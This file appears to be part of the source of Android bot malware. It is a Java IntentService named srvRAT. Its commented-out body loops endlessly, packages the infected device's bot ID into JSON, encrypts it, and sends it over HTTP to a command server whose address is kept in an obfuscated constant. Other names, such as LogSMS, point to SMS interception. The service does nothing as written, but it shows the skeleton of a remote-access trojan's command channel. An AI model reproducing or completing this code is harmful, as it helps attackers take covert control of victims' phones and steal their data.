package com.example.mmm.Service;

import android.app.IntentService;
import android.content.Intent;
import android.content.Context;

import com.example.mmm.Utils.utils;
import com.example.mmm.constants;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Locale;


public class srvRAT extends IntentService {

    public srvRAT() {
        super("");
    }
    utils utl = new utils();
    constants consts = new constants();

    private String TAG_LOG  = srvRAT.class.getSimpleName()+ consts.strTAG1;

    @Override
    protected void onHandleIntent(Intent intent) {
       /* String idbot = utl.SettingsRead(this, consts.idbot);
       while(true){
           utl.chalkTile(700);
           String response;
           //get command
           JSONObject jsonRAT = new JSONObject();
           try {
               jsonRAT.put("", idbot);
               jsonRAT.put(consts.string_71, idbot);//bot



           } catch (JSONException e) {
               utl.Log(TAG_LOG, consts.string_190);
               utl.SettingsToAdd(this, consts.LogSMS , consts.string_190 + e.toString() + consts.string_119);
           }

           utl.Log(TAG_LOG, "RAT_Responce" + jsonRAT.toString());
           response = utl.httpRequest(this, consts.str_http_3 + utl.trafEnCr(jsonRAT.toString()));


       }*/
    }


}
